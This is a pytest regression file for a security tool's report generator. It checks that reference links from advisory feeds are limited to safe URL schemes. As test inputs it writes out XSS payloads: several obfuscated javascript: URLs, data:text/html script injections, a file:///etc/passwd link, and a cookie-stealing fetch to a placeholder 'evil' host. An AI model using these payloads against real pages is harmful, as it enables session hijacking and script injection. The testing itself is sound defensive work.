"""Security regression: report link hrefs are scheme-allowlisted.

A finding's ``references`` can originate from external advisory feeds (OSV /
NVD / CIRCL / Exploit-DB), which HEAVEN does not control. Those URLs are
rendered as clickable links in the HTML report (and the PDF), and a report is
routinely shared with a client. ``html.escape`` alone stops an attribute
break-out but NOT a dangerous URL scheme, so a hostile ``javascript:`` /
``data:`` reference would otherwise become a live, clickable script link in the
opened report.

``heaven.devsecops.compliance_report._safe_href`` collapses any non
http/https/mailto scheme to ``"#"`` before it reaches an ``href``. These tests
pin that behaviour at the helper and end-to-end through a rendered report.
"""
from __future__ import annotations

import re

from heaven.devsecops.compliance_report import ComplianceReportGenerator, _safe_href


def test_safe_href_keeps_navigable_schemes():
    assert _safe_href("https://osv.dev/vulnerability/GHSA-x") == "https://osv.dev/vulnerability/GHSA-x"
    assert _safe_href("http://example.com/a?b=c") == "http://example.com/a?b=c"
    assert _safe_href("mailto:sec@example.com") == "mailto:sec@example.com"
    # relative / in-page / scheme-relative links are fine
    assert _safe_href("#anchor") == "#anchor"
    assert _safe_href("/relative/path") == "/relative/path"
    assert _safe_href("//cdn.example.com/x") == "//cdn.example.com/x"


def test_safe_href_neutralises_dangerous_schemes():
    for bad in (
        "javascript:alert(1)",
        "JavaScript:alert(1)",          # case
        "  javascript:alert(1)",        # leading whitespace
        "java\tscript:alert(1)",        # embedded control byte
        "\x01javascript:alert(1)",      # leading control byte
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox(1)",
        "file:///etc/passwd",
    ):
        assert _safe_href(bad) == "#", f"{bad!r} should collapse to #"


def test_safe_href_escapes_attribute_breakout():
    # A quote in the value must never break out of the href="" attribute.
    out = _safe_href('https://ok.com" onmouseover="alert(1)')
    assert '"' not in out
    assert "&quot;" in out


def test_report_html_has_no_dangerous_href():
    findings = [{
        "id": "1", "title": "Vulnerable dependency", "severity": "high",
        "vuln_type": "vulnerable_dependency", "target": "http://acme.test/",
        "confidence": 0.9, "status": "open",
        "evidence": {"references": [
            "https://osv.dev/vulnerability/GHSA-good",
            "javascript:fetch('//evil/'+document.cookie)",
            "data:text/html,<script>alert(1)</script>",
        ]},
    }]
    html = ComplianceReportGenerator().generate_html_report(findings, engagement_name="audit")
    hrefs = re.findall(r'href="([^"]*)"', html)
    dangerous = [h for h in hrefs if re.match(r"\s*(javascript|data|vbscript|file):", h, re.I)]
    assert not dangerous, f"dangerous href leaked into report: {dangerous}"
    # the benign reference is still a real, clickable link
    assert 'href="https://osv.dev/vulnerability/GHSA-good"' in html
    # the hostile reference collapsed to an inert anchor
    assert 'href="#"' in html


def test_pdf_report_routes_references_through_safe_href():
    # The PDF generator must route its reference links through a
    # scheme-allowlisting helper. Assert BEHAVIOUR, not object identity: under
    # the full suite the module object can differ from this test's import, but
    # the helper must always neutralise a dangerous scheme and keep a safe one.
    from heaven.devsecops import pdf_report
    assert callable(pdf_report._safe_href)
    assert pdf_report._safe_href("javascript:alert(1)") == "#"
    assert pdf_report._safe_href("https://osv.dev/x") == "https://osv.dev/x"
